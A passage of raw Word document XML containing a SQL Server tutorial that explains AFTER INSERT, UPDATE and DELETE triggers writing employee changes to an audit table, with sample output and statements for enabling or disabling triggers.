          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>inserted</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>has been used. This table is a logical table and contains the row that has been inserted. I have selected the fields from the logical inserted table from the row that has been inserted into different variables, and finally inserted those values into the Audit table.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">To see the newly created trigger in action, </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>lets</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> insert a row into the main table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eastAsiaTheme="majorEastAsia" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>insert</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'Chris'</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1500</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>);</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 xml:space="preserve">Now, a record has been inserted into the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Employee_Test</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> table.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AFTER INSERT</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">trigger attached to this table has inserted the record into the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Employee_Test_Audit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">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digit"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>6</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">Chris  </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-digit"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>1500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00</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">   Inserted Record -- After Insert Trigger.</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">2008-04-26 </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-digit"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>12</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00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55</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700</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(b) AFTER UPDATE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This trigger is fired after an update on the table. Let’s create the trigger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lastRenderedPageBreak/>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trgAfterUpdate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ON</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dbo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>.[</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>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FOR</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UPDATE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decimal</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2</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empname</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empsal</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i.Emp_Sal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inserted i;</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if</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update</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Emp_Name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audit_action</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'Updated Record -- After Update Trigger.'</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if</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update</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audit_action</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'Updated Record -- After Update Trigger.'</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insert</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Employee_Test_Audit(Emp_ID,Emp_Name,Emp_Sal,Audit_Action,Audit_Timestamp)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r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>,getdate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Style w:val="code-keyword"/>
          <w:rFonts w:ascii="Times New Roman" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>PRINT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'AFTER UPDATE Trigger fired.'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GO</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The AFTER UPDATE Trigger is created in which the updated record is inserted into the audit table. There is</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>no logical table updated like the logical table inserted.</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">We can obtain the updated value of a field from </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>the</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="990000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>update</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="990000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="990000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>column_name</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="990000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>function. In our trigger, we have used,</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 xml:space="preserve">if </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="990000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>update(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="990000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Emp_Name</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="990000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">to check if the column </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Emp_Name</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> has been updated. We have similarly checked the column </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Emp_Sal</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> for an update.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Let’s update a record column and see what happens.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Fonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>update</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set </w:t>
      </w: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1550</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> where </w:t>
      </w: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6</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>This inserts the row into the audit table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digit"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>6</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">  Chris</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-digit"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>1550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00</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">  Updated Record -- After Update Trigger.</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:tab/>
        <w:t xml:space="preserve">  2008-04-26 </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-digit"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>12</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38</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11</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843</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(c) AFTER DELETE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This trigger is fired after a delete on the table. Let’s create the trigger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lastRenderedPageBreak/>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trgAfterDelete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ON</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dbo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>.[</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>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AFTER </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-keyword"/>
          <w:rFonts w:ascii="Times New Roman" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>DELETE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decimal</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2</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empname</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empsal</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audit_action</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'Deleted -- After Delete Trigger.'</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insert</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Employee_Test_Audit</w:t>
      </w:r>
      <w:proofErr w:type="spell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Emp_ID</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>,Emp</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>_Name,Emp_Sal,Audit_Action,Audit_Timestamp</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empid</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empname</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empsal</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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audit_action</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>,getdate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Style w:val="code-keyword"/>
          <w:rFonts w:ascii="Times New Roman" w:eastAsiaTheme="majorEastAsia" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="0000FF"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>PRINT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'AFTER DELETE TRIGGER fired.'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GO</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In this trigger, the deleted record’s data is picked from the</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>logical deleted table</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>and inserted into the audit table. Let’s fire a delete on the main table. A record has been inserted into the audit table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digit"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>6</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">  Chris</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-digit"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>1550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00</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">  Deleted -- After Delete Trigger.  2008-04-26 </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="code-digit"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000080"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>12</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52</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13</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867</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">All the triggers can be </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>enabled/disabled</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> on the table using the statement</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ALTER</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TABLE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{ENABLE|DISBALE}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ALL</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Specific Triggers can be enabled or disabled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ALTER</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TABLE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DISABLE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trgAfterDelete</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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This disables the After Delete Trigger named</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:color w:val="111111"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
